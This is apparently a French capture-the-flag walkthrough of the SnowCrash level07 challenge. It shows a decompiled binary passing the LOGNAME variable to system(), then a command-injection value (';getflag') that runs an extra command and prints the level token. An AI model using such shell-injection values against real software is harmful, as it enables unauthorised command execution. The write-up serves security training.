On commence par lister les fichiers

```bash
level07@SnowCrash:~$ ls
level07
```

En décompilant le binaire via le site https://dogbolt.org/
On observe que :
```c
    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
    return system(var_1c);
```
Récupère la valeur de la variable d’environnement LOGNAME via getenv("LOGNAME").

Par défaut, le programme affiche simplement la valeur de LOGNAME
```c
level07@SnowCrash:~$ ./level07 
level07
```

On peut confirmer la valeur actuelle de LOGNAME
```bash
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=level07
```

On modifie donc la variable d’environnement LOGNAME pour y injecter un appel à `getflag`

```bash
level07@SnowCrash:~$ export LOGNAME=";getflag"
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```